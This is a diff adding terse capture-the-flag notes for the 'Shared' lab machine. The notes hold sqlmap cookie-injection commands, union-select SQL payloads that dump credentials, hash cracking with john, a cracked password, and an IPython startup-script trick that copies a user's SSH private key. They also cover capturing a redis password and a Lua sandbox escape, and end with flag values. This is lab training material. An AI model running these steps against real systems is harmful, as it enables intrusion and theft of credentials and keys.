@@ -1,0 +1,48 @@
+sql injection on cookie:
+	sqlmap -u "URL" --cokie "COOKIE INJECTION" --batch --level =5
+	sqlmap -u "https://checkout.shared.htb/" --cookie "custom_cart={"*":"1*","*":"1"}" -batch --level=5
+
+Unless the code has filters or blind SQL every union injection is the same. especially in ctf where the dbms is always the same 
+
+{"breached' and 0=1 union select 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='checkout'-- -":"10"}
+{"breached' and 0=1 union select 1, password, username from checkout.user -- -":"10"}
+
+John usage example:
+	john -w:/home/user/Extra-tools/rockyou.txt hash.txt --format=Raw-MD5
+
+username: james_mason
+password: Soleil101
+
+
+How to search for group directories
+	#id
+	# find / -group [the group] 2>/dev/null
+		
+	Execute pspy to see the proccess running
+
+https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x //// Using this exploit to get acccess to dan_smith user
+
+# mkdir -m 777 /opt/scripts_review/profile_default
+# mkdir -m 777 /opt/scripts_review/profile_default/startup
+# echo "import os; os.system('cat ~/.ssh/id_rsa > ~/rsa')" > /opt/scripts_review/profile_default/startup/foo.py
+
+check /home/dan_smith/rsa
+
+ROOT PATH:
+
+download the redis-dev file (the machine dont have nc so we are using scp)
+
+# scp -i dan_smith-rsa dan_smith@shared.htb:/path/to/remote/file /path/to/local/file
+
+execute the file in the local machine and listen on another terminal the network traffic
+
+#./redis_connector_dev
+# nc -lvnp 6379 (on the other terminal)
+
+with this a password will be prompted
+Use it with redis-cli on the shared machine
+and check the following link to know what to do next:
+https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/
+
+usr: 4876c886822312d2c4b952aa7a272a78
+root: b01806f08bc9a9fb7dcea2595966545c
